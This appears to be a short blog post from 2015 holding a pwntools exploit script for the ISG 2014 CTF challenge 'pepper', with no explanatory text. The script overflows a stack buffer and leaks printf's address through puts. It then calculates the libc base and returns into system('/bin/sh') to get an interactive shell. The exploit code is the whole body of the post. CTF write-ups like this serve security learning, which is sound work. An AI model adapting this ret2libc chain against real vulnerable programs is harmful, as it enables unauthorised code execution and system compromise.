---
layout: post
title: "isg2014-pepper-stack"
date: 2015-12-10 13:13:54 +0800
comments: true
categories: 
---
```python
#!/usr/bin/python
from pwn import *

libc = ELF('/usr/lib/libc.so.6')

elf = ELF('./pepper')
puts_plt = elf.symbols['puts']
printf_got = elf.got['printf']

sercet = 0x8048f67

p = process('./pepper')
p.recvuntil('choice:')
p.sendline('31337')
p.recvuntil('message:')
p.sendline('a'*0x70 + p32( puts_plt ) + p32( sercet ) + p32( printf_got ))
p.recvuntil('hanks.\n')
ite = libc.search('/bin/sh')
printf_r = u32( p.recv(4) )
libc_base = printf_r - libc.symbols['printf']
system_r = libc_base + libc.symbols['system']
sh = libc_base + ite.next()
print 'printf: ',hex( printf_r )
print 'libc_base: ',hex( libc_base )
print 'system: ',hex( system_r )
print 'sh: ',hex( sh )

p.recvuntil('message:')
p.sendline('a'*0x70 + p32( system_r ) + p32(sercet) + p32( sh ))

p.interactive()
```
